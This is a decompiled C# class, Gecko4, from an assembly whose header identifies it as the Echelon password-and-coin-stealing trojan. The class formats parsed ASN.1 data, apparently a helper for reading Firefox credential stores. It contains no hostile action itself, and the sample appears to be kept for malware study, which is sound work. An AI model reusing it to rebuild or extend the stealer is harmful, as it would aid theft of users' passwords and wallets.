// Decompiled with JetBrains decompiler
// Type: Echelon.Gecko4
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System.Collections.Generic;
using System.Text;

namespace Echelon
{
  public class Gecko4
  {
    public Gecko2 ObjectType { get; set; }

    public byte[] ObjectData { get; set; }

    public int ObjectLength { get; set; }

    public List<Gecko4> Objects { get; set; }

    public Gecko4() => this.Objects = new List<Gecko4>();

    public override string ToString()
    {
      StringBuilder stringBuilder1 = new StringBuilder();
      StringBuilder stringBuilder2 = new StringBuilder();
      switch (this.ObjectType)
      {
        case Gecko2.Integer:
          foreach (byte num in this.ObjectData)
            stringBuilder2.AppendFormat("{0:X2}", (object) num);
          stringBuilder1.Append("\tINTEGER ").Append((object) stringBuilder2).AppendLine();
          break;
        case Gecko2.OctetString:
          foreach (byte num in this.ObjectData)
            stringBuilder2.AppendFormat("{0:X2}", (object) num);
          stringBuilder1.Append("\tOCTETSTRING ").AppendLine(stringBuilder2.ToString());
          break;
        case Gecko2.ObjectIdentifier:
          foreach (byte num in this.ObjectData)
            stringBuilder2.AppendFormat("{0:X2}", (object) num);
          stringBuilder1.Append("\tOBJECTIDENTIFIER ").AppendLine(stringBuilder2.ToString());
          break;
        case Gecko2.Sequence:
          stringBuilder1.AppendLine("SEQUENCE {");
          break;
      }
      foreach (Gecko4 gecko4 in this.Objects)
        stringBuilder1.Append(gecko4.ToString());
      if (this.ObjectType == Gecko2.Sequence)
        stringBuilder1.AppendLine("}");
      stringBuilder2.Remove(0, stringBuilder2.Length - 1);
      return stringBuilder1.ToString();
    }
  }
}
